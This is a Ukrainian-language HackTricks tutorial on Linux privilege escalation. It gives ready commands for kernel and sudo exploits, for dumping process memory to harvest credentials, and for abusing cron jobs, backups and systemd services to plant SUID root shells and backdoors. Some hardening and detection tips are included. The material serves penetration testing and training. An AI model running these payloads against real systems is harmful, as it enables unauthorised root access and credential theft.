# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Давайте почнемо збирати інформацію про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права запису в будь-яку папку всередині змінної `PATH`**, ви можете hijack деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про змінні середовища

Чи містять змінні середовища цікаву інформацію, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи існує exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих ядер та деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де ви можете знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з цього сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустити на системі жертви, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо ваша версія kernel згадується в якомусь kernel exploit і тоді ви будете впевнені, що цей exploit дійсний.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, які наведені в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють неповноважним локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з директорії, контрольованої користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для exploit тієї [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском exploit, переконайтеся, що ваша версія `sudo` вразлива і що вона підтримує функцію `chroot`.

Для додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo до 1.9.17p1 (заявлений діапазон уражених версій: **1.8.8–1.9.17**) може оцінювати host-based sudoers правила, використовуючи **user-supplied hostname** з `sudo -h <host>` замість **real hostname**. Якщо sudoers надає ширші привілеї на іншому хості, ви можете **spoof** цей хост локально.

Вимоги:
- Вразлива версія sudo
- Правила sudoers, специфічні для хоста (хост не є поточним hostname та не `ALL`)

Приклад шаблону sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit шляхом підробки дозволеного хоста:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Якщо вирішення підробленої назви блокується, додайте її до `/etc/hosts` або використовуйте hostname, який вже з'являється в logs/configs, щоб уникнути DNS lookups.

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не вдалася

Перегляньте **smasher2 box of HTB** для **прикладу** того, як цю vuln could be exploited
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова системна енумерація
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічте можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Якщо ви перебуваєте всередині container, почніть зі наступного розділу container-security, а потім перейдіть до runtime-specific abuse pages:

{{#ref}}
container-security/
{{#endref}}

## Диски

Перевірте **що змонтовано та відмонтовано**, де і чому. Якщо щось відмонтовано, ви можете спробувати змонтувати це й перевірити на наявність конфіденційної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічте корисні binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

Перевірте **версії встановлених пакетів та сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна використати для escalating privileges…\
Рекомендується вручну перевірити версію найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Зауважте, що ці команди виведуть багато інформації, яка здебільшого буде марною, тому рекомендовано використовувати програми на кшталт OpenVAS або подібні, які перевіряють, чи будь-яка встановлена версія ПЗ вразлива до відомих exploits_

## Процеси

Подивіться, **які процеси** виконуються, і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (можливо tomcat виконується від імені root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте на наявність [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **check your privileges over the processes binaries**, можливо, ви зможете їх перезаписати.

### Cross-user parent-child chains

Дочірній процес, що працює під **different user**, ніж його батьківський процес, не є автоматично шкідливим, але це корисний **triage signal**. Деякі переходи очікувані (`root` spawning a service user, login managers creating session processes), але незвичні ланцюги можуть виявляти wrappers, debug helpers, persistence, or weak runtime trust boundaries.

Короткий огляд:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Якщо ви знаходите несподіваний ланцюг, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, допоміжні скрипти, робочий каталог, параметри, доступні для запису). У кількох реальних privesc paths сам дочірній процес не був доступний для запису, але **parent-controlled config** або допоміжний ланцюг були.

### Видалені виконувані файли та файли, відкриті після видалення

Артефакти виконання часто залишаються доступними **після видалення**. Це корисно як для privilege escalation, так і для відновлення доказів із процесу, який уже має відкриті чутливі файли.

Перевірте на наявність видалених виконуваних файлів:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес все ще виконує старий binary image з пам'яті. Це сильний сигнал для розслідування, оскільки:

- видалений executable може містити цікаві strings або credentials
- запущений процес може все ще надавати корисні file descriptors
- deleted privileged binary може вказувати на нещодавнє tampering або спробу cleanup

Зібрати deleted-open файли глобально:
```bash
lsof +L1
```
Якщо ви знайдете цікавий дескриптор, відновіть його безпосередньо:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Це особливо цінно, коли процес все ще має відкритий видалений секрет, скрипт, експорт бази даних або flag file.

### Моніторинг процесів

Ви можете використовувати інструменти, як-от [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які часто виконуються або коли виконуються певні умови.

### Пам'ять процесу

Деякі сервіси на сервері зберігають **облікові дані у відкритому тексті в пам'яті**.\
Зазвичай вам будуть потрібні **root privileges** для читання пам'яті процесів, що належать іншим користувачам; тому це зазвичай корисніше, коли ви вже root і хочете виявити більше облікових даних.\
Проте пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які належать вам**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Якщо ви маєте доступ до пам'яті FTP сервісу (наприклад), ви можете отримати Heap і шукати в ньому облікові дані.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу, **maps показують, як пам'ять відображається в його віртуальному адресному просторі**; вони також показують **дозволи кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **області пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **переміститися у файлі mem і вивантажити всі області, доступні для читання** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. До віртуального адресного простору ядра можна отримати доступ за допомогою /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише для **root** і групи **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це переосмислення для linux класичного інструменту ProcDump зі збірки інструментів Sysinternals для Windows. Отримати його за [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити дамп пам'яті процесу, ви можете використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і зробити dump процесу, яким ви володієте
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете зробити dump процесу (див. попередні розділи, щоб знайти різні способи знімання дампу пам'яті процесу) і шукати credentials у пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **відомих файлів**. Для належної роботи потрібні привілеї root.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher) запущений як root — веб-інтерфейсний планувальник privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) запущена від імені root і прив'язана лише до loopback, до неї все одно можна дістатися через SSH local port-forwarding і створити привілейоване завдання для ескалації.

Типова послідовність
- Виявити порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) і Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - systemd unit, що містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Налаштувати тунель і виконати вхід:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити завдання з високими привілеями і запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Зміцнення безпеки
- Не запускайте Crontab UI від імені root; обмежте його виділеним користувачем і мінімальними дозволами
- Прив'язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте повторно паролі
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть аудит/логування для виконання завдань за вимогою

Перевірте, чи якесь заплановане завдання вразливе. Можливо, ви зможете скористатися скриптом, який виконується від імені root (wildcard vuln? чи можна модифікувати файли, які використовує root? використати symlinks? створити специфічні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Якщо `run-parts` використовується, перевірте, які імена насправді будуть виконані:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Це запобігає хибним спрацьовуванням. Директорія periodic з правами запису корисна лише якщо ім'я вашого payload-файлу відповідає локальним правилам `run-parts`.

### Cron шлях

Наприклад, у файлі _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, як користувач "user" має права на запис у /home/user_)

Якщо у цьому crontab користувач root намагається виконати якусь команду або скрипт без встановлення PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, що використовує скрипт з wildcard (Wildcard Injection)

Якщо скрипт, що виконується від імені root, має “**\***” всередині команди, це можна використати для виклику непередбачених дій (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху на кшталт** _**/some/path/\***_ **, він не вразливий (навіть** _**./\***_ **не вразливий).**

Прочитайте наступну сторінку для отримання додаткових трюків експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation в ((...)), $((...)) та let. Якщо root cron/parser зчитує ненадійні поля журналу і підставляє їх в arithmetic context, зловмисник може інжектувати command substitution $(...), який виконається як root при запуску cron.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Змусьте запис у лог, контрольований зловмисником, щоб числовоподібне поле містило command substitution і закінчувалося цифрою. Переконайтесь, що ваша команда не друкує в stdout (або перенаправте її), щоб арифметика залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Перезапис Cron-скрипта та symlink

Якщо ви **можете змінити cron script**, що виконується як root, ви дуже просто отримаєте shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, що виконується під root, використовує **directory, до якої ви маєте повний доступ**, можливо, варто видалити цю folder і **створити symlink folder, що вказує на іншу**, яка містить script, контрольований вами.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Перевірка symlink і безпечніша обробка файлів

Під час перегляду привілейованих скриптів/бінарних файлів, які читають або записують файли за шляхом, перевіряйте, як обробляються посилання:

- `stat()` слідує за symlink і повертає метадані цільового об'єкта.
- `lstat()` повертає метадані самого symlink.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показують права доступу кожного компонента шляху.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Для захисників/розробників, більш безпечні підходи проти symlink tricks включають:

- `O_EXCL` with `O_CREAT`: відмовлятися, якщо шлях уже існує (блокує попередньо створені зловмисником посилання/файли).
- `openat()`: працювати відносно довіреного файлового дескриптора директорії.
- `mkstemp()`: створювати тимчасові файли атомарно з безпечними правами доступу.

### Custom-signed cron binaries with writable payloads
Blue teams іноді «sign» cron-driven binaries, дампуючи кастомний ELF-розділ і виконуючи grep по рядку вендора перед запуском їх від root. Якщо цей бінарний файл групово-записуваний (наприклад, `/opt/AV/periodic-checks/monitor` належить `root:devs 770`) і ви можете leak матеріали підпису, ви можете підробити розділ і перехопити cron-завдання:

1. Використайте `pspy` для захоплення потоку перевірки. В Era root виконував `objcopy --dump-section .text_sig=text_sig_section.bin monitor` після чого `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` і потім запускав файл.
2. Відтворіть очікуваний сертифікат, використовуючи leaked key/config (з `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Зберіть шкідливу заміну (наприклад, створіть SUID bash, додайте свій SSH key) і вбудуйте сертифікат у `.text_sig`, щоб grep пройшов:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть запланований бінарний файл, зберігаючи біти виконання:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Чекайте наступного запуску cron; коли наївна перевірка підпису пройде, ваш payload виконається від імені root.

### Frequent cron jobs

Ви можете моніторити процеси, щоб знайти ті, що виконуються кожну 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити привілеї.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **сортувати за найменш виконуваними командами** і видаляти команди, які виконувалися найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це буде відстежувати та перераховувати кожен процес, що запускається).

### Резервні копії root, які зберігають встановлені атакуючим mode bits (pg_basebackup)

Якщо cron, що належить root, запускає `pg_basebackup` (або будь-яке рекурсивне копіювання) для директорії бази даних, в яку ви можете записувати, ви можете підкласти **SUID/SGID binary**, який буде повторно скопійований як **root:root** з тими ж mode bits у вихідний бекап.

Typical discovery flow (as a low-priv DB user):
- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
This works because `pg_basebackup` preserves file mode bits when copying the cluster; when invoked by root the destination files inherit **root ownership + attacker-chosen SUID/SGID**. Any similar privileged backup/copy routine that keeps permissions and writes into an executable location is vulnerable.

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Щоб виявити такий прихований вхід, перегляньте файли cron за допомогою інструментів, що відображають керуючі символи:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Сервіси

### Доступні для запису _.service_ файли

Перевірте, чи можете записувати будь-який `.service` файл, якщо можете, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** сервіс **запускається**, **перезапускається** або **зупиняється** (можливо вам доведеться почекати, поки машина не буде перезавантажена).\
Наприклад створіть ваш backdoor всередині .service файлу з **`ExecStart=/tmp/script.sh`**

### Доступні для запису бінарні файли сервісів

Майте на увазі, що якщо у вас є **права запису над бінарними файлами, які виконуються сервісами**, ви можете змінити їх на backdoors, щоб коли сервіси будуть повторно запущені, backdoors були виконані.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** у будь-якій із папок шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати **relative paths being used on service configurations** у файлах, таких як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **executable** з **тим же ім'ям, що й бінарний файл по відносному шляху** всередині папки PATH systemd, у яку ви маєте право запису, і коли служба буде запитана виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете використати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це unit-файли systemd, назва яких закінчується на `**.timer**`, які керують `**.service**` файлами або подіями. **Таймери** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку календарних часових подій та монотонних часових подій і можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити таймер, ви можете змусити його запускати існуючі systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Unit, який потрібно активувати, коли цей таймер спливає. Аргумент — це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає .service з тим самим ім'ям, що й таймер-юнит, за винятком суфіксу. (Див. вище.) Рекомендується, щоб ім'я unit, яке активується, і ім'я таймер-юниту називались ідентично, за винятком суфіксу.

Тому, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує двійковий файл, доступний для запису**
- Знайти якийсь systemd unit, який **запускає відносний шлях** і над **systemd PATH** у вас є **права на запис** (щоб видаватися за цей виконуваний файл)

**Learn more about timers with `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні привілеї root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix доменні сокети (UDS) дозволяють **взаємодію процесів** на тій самій або різних машинах у моделях клієнт‑сервер. Вони використовують стандартні файли дескрипторів Unix для міжкомп'ютерного зв'язку і налаштовуються через файли `.socket`.

Sockets can be configured using `.socket` files.

**Дізнайтеся більше про сокети через `man systemd.socket`.** Всередині цього файлу можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але загалом використовуються для **вказання місця прослуховування** сокета (шлях до файлу AF_UNIX сокета, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, створюється **екземпляр service для кожного вхідного з'єднання**, і йому передається лише сокет з'єднання. Якщо **false**, всі прослуховуючі сокети **передаються запущеному service unit**, і створюється лише один service unit для всіх з'єднань. Це значення ігнорується для datagram сокетів і FIFO, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або кілька командних стрічок, які виконуються **до** або **після** створення та прив'язки прослуховуючих сокетів/FIFO відповідно. Перший токен командного рядка має бути абсолютним шляхом до файлу, після якого йдуть аргументи для процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які виконуються **до** або **після** закриття та видалення прослуховуючих сокетів/FIFO відповідно.
